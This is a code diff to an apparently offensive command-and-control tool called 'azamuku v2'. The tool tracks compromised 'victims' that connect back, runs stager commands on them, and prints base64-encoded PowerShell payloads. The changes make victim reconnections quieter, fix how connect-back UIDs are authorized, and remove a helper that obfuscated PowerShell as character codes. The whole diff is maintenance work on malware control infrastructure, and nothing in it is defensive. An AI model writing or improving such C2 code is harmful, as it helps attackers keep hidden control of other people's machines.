@@ -25,6 +25,7 @@ newest = None
 # hotPlugPort = None
 
 selected = []
+silent_uids = set()  # Track UIDs added via allow/grab to suppress notifications
 
 def getInfo():
     global stager, newest, args
@@ -38,7 +39,6 @@ def getInfo():
         if len(s.connects) > old:
             newUID = s.connects[-1]
             control = s.client(newUID)
-
 
             if args.strict == False:
                 mac_cmd = (
@@ -73,15 +73,18 @@ def getInfo():
                 except Exception as e:
                     print("\n[+] failed to run stager on uid '{}' - '{}'".format(x, e))
 
-            # Notify user of new connection
-            try:
-                ip_addr = s.vicInfo[newUID]['ip']
-                hostname = s.vicInfo[newUID]['hostname']
-                print(f"\n\n[!] New victim connected: {newUID} ({hostname} @ {ip_addr})\n")
-                print("[" + coolFade("azamuku v2", (125,0,0), (125,0,0)).strip() +"]> ", end="", flush=True)
-            except:
-                print(f"\n\n[!] New victim connected: {newUID} ({hostname})\n")
-                print("[" + coolFade("azamuku v2", (125,0,0), (125,0,0)).strip() +"]> ", end="", flush=True)
+            # Notify user of new connection (unless it was added via allow/grab)
+            if newUID not in silent_uids:
+                try:
+                    ip_addr = s.vicInfo[newUID]['ip']
+                    hostname = s.vicInfo[newUID]['hostname']
+                    print(f"\n\n[!] New victim connected: {newUID} ({hostname} @ {ip_addr})\n")
+                    print("[" + coolFade("azamuku v2", (125,0,0), (125,0,0)).strip() +"]> ", end="", flush=True)
+                except:
+                    pass
+            else:
+                # Remove from silent_uids so we don't suppress future reconnections
+                silent_uids.discard(newUID)
 
             if newest == False:
                 newest = newUID
@@ -89,7 +92,7 @@ def getInfo():
             old = len(s.connects)
 
         else:
-            time.sleep(0.1)    
+            time.sleep(0.1)
 
 def monitorConnections():
     """
@@ -220,12 +223,8 @@ def interactive(uid):
 
     return None
 
-def _to_charcode(text):
-    """Convert a string to PowerShell [char]0xNN obfuscated form."""
-    return '+'.join(f'[char]0x{ord(c):02x}' for c in text)
-
 def print_payload(payload, highlights, args):
-    """Print payload, optionally encoding it as base64 or hex based on CLI flags."""
+    """Print payload, optionally encoding it base64 based on CLI flags."""
     if args.base64:
         encoded = _b64.b64encode(payload.encode('utf-16-le')).decode()
         print("[+] base64 encode:\n")
@@ -604,12 +603,16 @@ if __name__ == '__main__':
                     if cArgs in os.listdir(os.path.dirname(cArgs)):
                         uids = open(cArgs, "r").read().split("\n")
                         for x in uids:
-                            s.authorized.append(cArgs)
+                            s.authorized.append(x)
+                            silent_uids.add(x)  # Mark as silent to suppress future notifications
+                            getInfo()  # Refresh victim info to show newly allowed UIDs
                         print("[+] allowed {} uids to connect back, from file '{}'".format(len(uids), cArgs))
+
                 except:
                     pass
                 
                 s.authorized.append(cArgs)
+                silent_uids.add(cArgs)  # Mark as silent to suppress notifications
                 print('[+] allowed uid \'{}\' to connect back'.format(cArgs))
 
             elif cmd.lower() == "grab":
@@ -617,6 +620,7 @@ if __name__ == '__main__':
                     print("[+] this allows *unauthenticated* payloads to be re-authenticated - be careful")
                     s.enableGrab = True
                     print("[+] enabled grabbing old sessions - toggle this by running 'grab' again")
+                    getInfo()  # Refresh victim info to show any newly grabbed UIDs
                 else:
                     s.enableGrab = False
                     print("[+] disabled grabbing")
